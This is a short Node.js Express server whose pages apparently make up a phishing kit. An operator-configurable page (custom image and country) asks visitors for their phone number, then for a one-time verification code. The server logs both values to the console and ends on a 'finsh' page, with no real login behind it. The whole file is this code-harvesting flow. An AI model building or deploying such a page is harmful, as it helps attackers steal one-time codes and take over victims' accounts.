const { urlencoded } = require('body-parser');
const express  = require('express');
const app = express();
const multer  = require('multer')
const fs = require('fs');

// let isExist = fs.existsSync('./static/uploads/user.jpg');
// if(isExist){
//   fs.unlink(`${__dirname}\\uploads\\user.jpg`,(err)=>{
//     if(err){
//       console.log(err);
//     }
// });
// }

// app.use(express.static(`${__dirname}//static`))
app.use(express.static('./static'))
app.use(express.urlencoded())
app.set('view engine','hbs');
// app.set('views',`${__dirname}\\static\\views`);
app.set('views','./static/views');


let name;
const storage = multer.diskStorage({
    destination: function (req, file, cb) {
      cb(null, `${__dirname}/static/uploads`)
    },
    filename: function (req, file, cb) {
      const uniqueSuffix = '.jpg'
      cb(null, file.fieldname + uniqueSuffix)
    }
  })

  const upload = multer({ storage: storage })
  
  app.get('/upload',(req,res)=>{
    res.render('control')
    
  })
  
let countryName;
let imgLink;
imgLink = 'img/default2.png';
app.post('/upload', upload.single('user'), function (req, res, next) {
  
  let check = req.body.default;
  console.log(check);
  if(check=='on'){
    imgLink = 'img/default2.png'
    countryName = req.body.country2;
  }
  else{
    req.file.user;
    imgLink = 'uploads/user.jpg'
    countryName = req.body.country;
  }

  res.redirect('/')
})



app.get("/",(req,res)=>{

    res.render('index',{country:countryName,imgLink:imgLink})
})


let number;
app.post('/',(req,res)=>{
    number = req.body.number
    console.log("Number is: "+number)
    res.redirect("/code")
})

app.get('/code',(req,res)=>{
    res.render('number',{number:number,imgLink:imgLink})
})

app.post('/code',(req,res)=>{
    console.log('the otp is: '+req.body.code);
    res.redirect('/finsh');
})
app.get('/finsh',(req,res)=>{
    // console.log(req.body.code);
    res.render('finsh');
})



app.listen('8000',()=>{
    console.log("our server is running on the sky");
})